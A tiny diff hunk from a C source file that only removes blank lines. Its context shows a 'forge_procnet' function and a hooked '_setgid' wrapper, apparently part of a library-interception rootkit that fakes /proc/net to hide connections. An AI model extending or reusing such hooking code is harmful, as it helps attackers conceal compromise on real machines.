@@ -35,8 +35,6 @@ FILE *forge_procnet(const char *pathname);
 #include "forge_procnet.c"
 #endif
 
-
-
 void _setgid(gid_t gid){
     hook(CSETGID);
     call(CSETGID, gid);
